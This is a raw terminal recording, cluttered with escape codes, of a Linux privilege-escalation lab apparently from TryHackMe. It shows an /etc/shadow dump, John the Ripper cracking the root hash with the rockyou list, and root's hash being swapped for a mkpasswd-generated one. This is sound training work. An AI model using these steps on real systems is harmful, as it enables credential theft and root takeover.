wYpT2O1zrR2xTROv7wRIkF8[m[37m[40m[48;5;242m.:17298:0:99999:7:::[m[37m[40m[24;5H[48;5;242mstatd[m[37m[40m[48;5;242m:*:17299:0:99999:7:::[m[37m[40m[25;6H[48;5;242mysql[m[37m[40m[48;5;242m:!:18133:0:99999:7:::[m[37m[40m[33;84H[38;5;231m[48;5;233m        [m[37m[40m[38;5;233m[48;5;233m[m[37m[40m[33;93H[38;5;231m[48;5;233m text [33;100H  [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;103H[38;5;231m[48;5;235m  utf-8 [33;112H  [m[37m[40m[38;5;88m[48;5;235m[m[37m[40m[33;115H[38;5;231m[48;5;88m 24 words 100% [m[37m[40m[1m[38;5;231m[48;5;88m☰ 24/[25;5H[?25h[?25l[m[37m[40m[35;134Hx [25;5H[35;134H [2;5H[1;1H[38;5;231m[48;5;22m hash.txt+ [1;13H [m[37m[40m[38;5;22m[48;5;233m [m[37m[40m[2;5H[K[3;1H[94m~                                                                                                                                               [4;1H~                                                                                                                                               [5;1H~                                                                                                                                               [6;1H~                                                                                                                                               [7;1H~                                                                                                                                               [8;1H~                                                                                                                                               [9;1H~                                                                                                                                               [10;1H~                                                                                                                                               [11;1H~                                                                                                                                               [12;1H~                                                                                                                                               [13;1H~                                                                                                                                               [14;1H~                                                                                                                                               [15;1H~                                                                                                                                               [16;1H~                                                                                                                                               [17;1H~                                                                                                                                               [18;1H~                                                                                                                                               [19;1H~                                                                                                                                               [20;1H~                                                                                                                                               [21;1H~                                                                                                                                               [22;1H~                                                                                                                                               [23;1H~                                                                                                                                               [24;1H~                                                                                                                                               [25;1H~                                                                                                                                               [m[37m[40m[33;1H[38;5;189m[48;5;25m [m[37m[40m[1m[38;5;189m[48;5;25mNORMAL[m[37m[40m[38;5;231m[48;5;88m [m[37m[40m[38;5;189m[48;5;25m  SPELL [EN] [m[37m[40m[38;5;25m[48;5;235m[m[37m[40m[33;42H[38;5;215m[48;5;233m hash.txt[+]                                         [m[37m[40m[38;5;233m[48;5;233m[m[37m[40m[33;96H[38;5;59m[48;5;233m text [33;103H  [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;106H[38;5;231m[48;5;235m  utf-8 [33;115H  [m[37m[40m[38;5;25m[48;5;235m[m[37m[40m[33;118H[38;5;189m[48;5;25m 0 words 100% [m[37m[40m[1m[38;5;189m[48;5;25m☰ 0[m[37m[40m[1m[38;5;231m[48;5;88m2[m[37m[40m[1m[38;5;189m[48;5;25m/1 ㏑[m[37m[40m[38;5;231m[48;5;88m:[m[37m[40m[38;5;189m[48;5;25m:1 [m[37m[40m[38;5;166m[48;5;25m[m[37m[40m[34;1H[K[35;1H[K]2;hash.txt + (~/Projects/Github/ctf/thme/Linux PrivEsc) - VIM[34;1H--No lines in buffer--[2;5H[?25h[?25l[?25h[?25l[48;5;242m ~_ [m[37m[40m[33;27H[38;5;231m[48;5;235m1 -23 ᚠ master [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;43H[38;5;215m[48;5;233m hash.txt[+][2;5H[?25h[?25l[m[37m[40m[35;134Hi[2;5H[35;134H [2;5H[35;1H[1m-- INSERT --[m[37m[40m[33;1H[38;5;231m[48;5;22m [m[37m[40m[1m[38;5;231m[48;5;22mINSERT[m[37m[40m[38;5;189m[48;5;25m [m[37m[40m[38;5;231m[48;5;22m  SPELL [EN] [m[37m[40m[38;5;22m[48;5;235m[m[37m[40m[33;95H[38;5;233m[48;5;233m[m[37m[40m[33;96H[38;5;231m[48;5;233m text [33;103H  [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;117H[38;5;22m[48;5;235m[m[37m[40m[33;118H[38;5;231m[48;5;22m 0 words 100% [m[37m[40m[1m[38;5;231m[48;5;22m☰ 0[m[37m[40m[1m[38;5;189m[48;5;25m/[m[37m[40m[1m[38;5;231m[48;5;22m/1 ㏑[m[37m[40m[38;5;189m[48;5;25m:[m[37m[40m[38;5;231m[48;5;22m:1 [m[37m[40m[38;5;166m[48;5;22m[2;5H[?25h[?25l[m[37m[40m$6$Tb/[101meuwmK[m[37m[40m$[101mOXA[m[37m[40m.[101mdwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET[m[37m[40m..[101mit8r[m[37m[40m.jbrlpfZeMdwD3B0fGxJI0[33;94H[38;5;233m[48;5;233m[m[37m[40m[33;95H[38;5;231m[48;5;233m text [33;102H [m[37m[40m[1C[38;5;235m[48;5;233m[m[37m[40m[33;105H[38;5;231m[48;5;235m  utf-8 [33;114H [m[37m[40m[1C[38;5;22m[48;5;235m[m[37m[40m[33;117H[38;5;231m[48;5;22m 1 words 100% [m[37m[40m[1m[38;5;231m[48;5;22m☰ 1/1 ㏑ [m[37m[40m[38;5;231m[48;5;22m::99[2;103H[?25h[?25l[?25h[m[37m[40m[35;1H[K[2;102H[?25l[35;134H^[[2;102H[35;134H  [2;103H[34;1H[K[2;82H[101mjbrlpfZeMdwD3B0fGxJI0[m[37m[40m[33;1H[38;5;189m[48;5;25m [m[37m[40m[1m[38;5;189m[48;5;25mNORMAL[m[37m[40m[38;5;231m[48;5;22m [m[37m[40m[38;5;189m[48;5;25m  SPELL [EN] [m[37m[40m[38;5;25m[48;5;235m[m[37m[40m[33;94H[38;5;233m[48;5;233m[m[37m[40m[33;95H[38;5;59m[48;5;233m text [33;102H  [m[37m[40m[38;5;235m[48;5;233m[m[37m[40m[33;116H[38;5;25m[48;5;235m[m[37m[40m[33;117H[38;5;189m[48;5;25m 1 words 100% [m[37m[40m[1m[38;5;189m[48;5;25m☰ 1[m[37m[40m[1m[38;5;231m[48;5;22m/[m[37m[40m[1m[38;5;189m[48;5;25m/1 ㏑[m[37m[40m[38;5;231m[48;5;22m:[m[37m[40m[38;5;189m[48;5;25m:98 [m[37m[40m[38;5;166m[48;5;25m[2;102H[?25h[?25l[?25h[?25l[m[37m[40m[35;134H:[2;102H[35;134H[K[34;1H:[?25hwq[?25l[?2004l[>4;m"hash.txt" 1L, 99C written
+]2;Thanks for flying Vim[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t
+[39;49m[?2004l[?1l>[?25h[>4;m[?1049l[23;0;0t[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mjohn --wordlist=/opt/w[Kj[Kwordlist/john/rockyou2.txt hash.txt 
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+No password hashes left to crack (see FAQ)
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mjohn --wordlist=/opt/wordlist/john/rockyou2.txt hash.txt [C[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1@s[1@h[1@o[1@w
+?:password123
+
+1 password hash cracked, 0 left
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mjohn --show hash.txt [36@wordlist=/opt/wordlist/john/rockyou2.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvim hash.txt[K[1@nano[C[C[C[C[C[C[C[C[C[1Pcat[C[C[C[C[C[C[C[C[Cls[Kssh user@10.10.166.44
+user@10.10.166.44's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Dec 18 07:12:05 2020 from ip-10-6-39-210.eu-west-1.compute.internal
+]0;user@debian: ~user@debian:~$ su root
+Password: 
+root@debian:/home/user# mkpasswd -m sha-512 newpasswordhere
+$6$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.
+root@debian:/home/user# vim .[K/wt[K[Ketc/sho[Kadow
+[?1049h[?1h=[1;35r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[35;1H"/etc/shadow" 24L, 837C[>c[1;1Hroot:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+[94m~                                                                                                                                               [26;1H~                                                                                                                                               [27;1H~                                                                                                                                               [28;1H~                                                                                                                                               [29;1H~                                                                                                                                               [30;1H~                                                                                                                                               [31;1H~                                                                                                                                               [32;1H~                                                                                                                                               [33;1H~                                                                                                                                               [34;1H~                                                                                                                                               [m[35;127H1,1[11CAll[1;1H[?12l[?25h[?25l[35;129H2[1;2H[?12l[?25h[?25l[35;129H3[1;3H[?12l[?25h[?25l[35;129H4[1;4H[?12l[?25h[?25l[35;129H5[1;5H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l:6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;122H[K[1;6H[?12l[?25h[?25l:$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;121H[K[1;6H[?12l[?25h[?25l:Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;120H[K[1;6H[?12l[?25h[?25l:b/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;119H[K[1;6H[?12l[?25h[?25l:/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;118H[K[1;6H[?12l[?25h[?25l:euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;117H[K[1;6H[?12l[?25h[?25l:uwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;116H[K[1;6H[?12l[?25h[?25l:wmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;115H[K[1;6H[?12l[?25h[?25l:mK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;114H[K[1;6H[?12l[?25h[?25l:K$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;113H[K[1;6H[?12l[?25h[?25l:$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;112H[K[1;6H[?12l[?25h[?25l:OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;111H[K[1;6H[?12l[?25h[?25l:XA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;110H[K[1;6H[?12l[?25h[?25l:A.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;109H[K[1;6H[?12l[?25h[?25l:.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;108H[K[1;6H[?12l[?25h[?25l:dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;107H[K[1;6H[?12l[?25h[?25l:wMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;106H[K[1;6H[?12l[?25h[?25l:MeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;105H[K[1;6H[?12l[?25h[?25l:eOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;104H[K[1;6H[?12l[?25h[?25l:OAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;103H[K[1;6H[?12l[?25h[?25l:AcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;102H[K[1;6H[?12l[?25h[?25l:copwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;101H[K[1;6H[?12l[?25h[?25l:opwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;100H[K[1;6H[?12l[?25h[?25l:pwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;99H[K[1;6H[?12l[?25h[?25l:wBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;98H[K[1;6H[?12l[?25h[?25l:Bl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;97H[K[1;6H[?12l[?25h[?25l:l68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;96H[K[1;6H[?12l[?25h[?25l:68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;95H[K[1;6H[?12l[?25h[?25l:8boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;94H[K[1;6H[?12l[?25h[?25l:boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;93H[K[1;6H[?12l[?25h[?25l:oTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;92H[K[1;6H[?12l[?25h[?25l:TG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;91H[K[1;6H[?12l[?25h[?25l:G5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;90H[K[1;6H[?12l[?25h[?25l:5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;89H[K[1;6H[?12l[?25h[?25l:zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;88H[K[1;6H[?12l[?25h[?25l:i65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;87H[K[1;6H[?12l[?25h[?25l:65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;86H[K[1;6H[?12l[?25h[?25l:5wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;85H[K[1;6H[?12l[?25h[?25l:wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;84H[K[1;6H[?12l[?25h[?25l:IHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;83H[K[1;6H[?12l[?25h[?25l:Hsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;82H[K[1;6H[?12l[?25h[?25l:sc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;81H[K[1;6H[?12l[?25h[?25l:c84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;80H[K[1;6H[?12l[?25h[?25l:84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;79H[K[1;6H[?12l[?25h[?25l:4OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;78H[K[1;6H[?12l[?25h[?25l:OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;77H[K[1;6H[?12l[?25h[?25l:WAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;76H[K[1;6H[?12l[?25h[?25l:AIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;75H[K[1;6H[?12l[?25h[?25l:Iye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;74H[K[1;6H[?12l[?25h[?25l:ye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;73H[K[1;6H[?12l[?25h[?25l:e5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;72H[K[1;6H[?12l[?25h[?25l:5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;71H[K[1;6H[?12l[?25h[?25l:VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;70H[K[1;6H[?12l[?25h[?25l:ITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;69H[K[1;6H[?12l[?25h[?25l:TLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;68H[K[1;6H[?12l[?25h[?25l:LLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;67H[K[1;6H[?12l[?25h[?25lLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;66H[K[1;6H[?12l[?25h[?25l:tVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;65H[K[1;6H[?12l[?25h[?25l:VlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;64H[K[1;6H[?12l[?25h[?25l:laXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;63H[K[1;6H[?12l[?25h[?25l:aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;62H[K[1;6H[?12l[?25h[?25l:XvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;61H[K[1;6H[?12l[?25h[?25l:vRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;60H[K[1;6H[?12l[?25h[?25l:RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;59H[K[1;6H[?12l[?25h[?25l:DJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;58H[K[1;6H[?12l[?25h[?25l:JXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;57H[K[1;6H[?12l[?25h[?25l:XET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;56H[K[1;6H[?12l[?25h[?25l:ET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;55H[K[1;6H[?12l[?25h[?25l:T..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;54H[K[1;6H[?12l[?25h[?25l:..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;53H[K[1;6H[?12l[?25h[?25l.it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;52H[K[1;6H[?12l[?25h[?25l:it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;51H[K[1;6H[?12l[?25h[?25l:t8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;50H[K[1;6H[?12l[?25h[?25l:8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;49H[K[1;6H[?12l[?25h[?25l:r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;48H[K[1;6H[?12l[?25h[?25l:.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;47H[K[1;6H[?12l[?25h[?25l:jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;46H[K[1;6H[?12l[?25h[?25l:brlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;45H[K[1;6H[?12l[?25h[?25l:rlpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;44H[K[1;6H[?12l[?25h[?25l:lpfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;43H[K[1;6H[?12l[?25h[?25l:pfZeMdwD3B0fGxJI0:17298:0:99999:7:[1;42H[K[1;6H[?12l[?25h[?25l:fZeMdwD3B0fGxJI0:17298:0:99999:7:[1;41H[K[1;6H[?12l[?25h[?25l:ZeMdwD3B0fGxJI0:17298:0:99999:7:[1;40H[K[1;6H[?12l[?25h[?25l:eMdwD3B0fGxJI0:17298:0:99999:7:[1;39H[K[1;6H[?12l[?25h[?25l:MdwD3B0fGxJI0:17298:0:99999:7:[1;38H[K[1;6H[?12l[?25h[?25l:dwD3B0fGxJI0:17298:0:99999:7:[1;37H[K[1;6H[?12l[?25h[?25l:wD3B0fGxJI0:17298:0:99999:7:[1;36H[K[1;6H[?12l[?25h[?25l:D3B0fGxJI0:17298:0:99999:7:[1;35H[K[1;6H[?12l[?25h[?25l:3B0fGxJI0:17298:0:99999:7:[1;34H[K[1;6H[?12l[?25h[?25l:B0fGxJI0:17298:0:99999:7:[1;33H[K[1;6H[?12l[?25h[?25l:0fGxJI0:17298:0:99999:7:[1;32H[K[1;6H[?12l[?25h[?25l:fGxJI0:17298:0:99999:7:[1;31H[K[1;6H[?12l[?25h[?25l:GxJI0:17298:0:99999:7:[1;30H[K[1;6H[?12l[?25h[?25l:xJI0:17298:0:99999:7:[1;29H[K[1;6H[?12l[?25h[?25l:JI0:17298:0:99999:7:[1;28H[K[1;6H[?12l[?25h[?25l:I0:17298:0:99999:7:[1;27H[K[1;6H[?12l[?25h[?25l:0:17298:0:99999:7:[1;26H[K[1;6H[?12l[?25h[?25l::17298:0:99999:7:[1;25H[K[1;6H[?12l[?25h[?25l:17298:0:99999:7:[1;24H[K[1;6H[?12l[?25h[?25l:7298:0:99999:7:[1;23H[K[1;6H[?12l[?25h[?25l:298:0:99999:7:[1;22H[K[1;6H[?12l[?25h[?25l:98:0:99999:7:[1;21H[K[1;6H[?12l[?25h[?25l:8:0:99999:7:[1;20H[K[1;6H[?12l[?25h[?25l::0:99999:7:[1;19H[K[1;6H[?12l[?25h[?25l[35;129H18[1;18H[?12l[?25h[?25l[35;127H6,26[6;26H[?12l[?25h[?25l[35;1H[1m-- INSERT --[m[35;13H[K[35;127H6,27[10CAll[6;26H:MuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.[35;129H128[6;128H[?12l[?25h[?25l[35;127H7,25 [7;25H[?12l[?25h[?25l[35;127H6,128[6;128H[?12l[?25h[?25l[35;127H7,25 [7;25H[?12l[?25h[35;1H[K[7;24H[?25l[35;127H7,24[10CAll[7;24H[?12l[?25h[?25l[35;1H1 change; before #105  7 seconds ago[35;127H[K[6;27H[K[35;127H6,26[10CAll[6;26H[?12l[?25h[?25l[35;130H5[6;25H[?12l[?25h[?25l[35;127H5[5;25H[?12l[?25h[?25l[35;130H4[5;24H[?12l[?25h[?25l[35;127H4[4;24H[?12l[?25h[?25l[35;130H3[4;23H[?12l[?25h[?25l[35;130H2[4;22H[?12l[?25h[?25l[35;130H1[4;21H[?12l[?25h[?25l[35;130H0[4;20H[?12l[?25h[?25l[35;129H19[4;19H[?12l[?25h[?25l[35;130H8[4;18H[?12l[?25h[?25l[35;130H7[4;17H[?12l[?25h[?25l[35;130H6[4;16H[?12l[?25h[?25l[35;130H5[4;15H[?12l[?25h[?25l[35;130H4[4;14H[?12l[?25h[?25l[35;130H3[4;13H[?12l[?25h[?25l[35;130H2[4;12H[?12l[?25h[?25l[35;130H1[4;11H[?12l[?25h[?25l[35;130H0[4;10H[?12l[?25h[?25l[35;129H9 [4;9H[?12l[?25h[?25l[35;129H8[4;8H[?12l[?25h[?25l[35;129H7[4;7H[?12l[?25h[?25l[35;129H6[4;6H[?12l[?25h[?25l[35;129H5[4;5H[?12l[?25h[?25l[35;129H4[4;4H[?12l[?25h[?25l[35;127H3[3;4H[?12l[?25h[?25l[35;127H2[2;4H[?12l[?25h[?25l[35;127H1[1;4H[?12l[?25h[?25l[35;129H5[1;5H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l[35;129H7[1;7H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l[35;1H[1m-- INSERT --[m[35;13H[K[35;127H1,6[11CAll[1;6H[?12l[?25h[?25l: :0:99999:7:::[35;129H7[1;7H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l:$6$aMuK.Agxm4yt6vE$g70MpLOjmJzUwf5Tbv9Y6jqIfe5wzIuBuXJa/MHWQuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN. 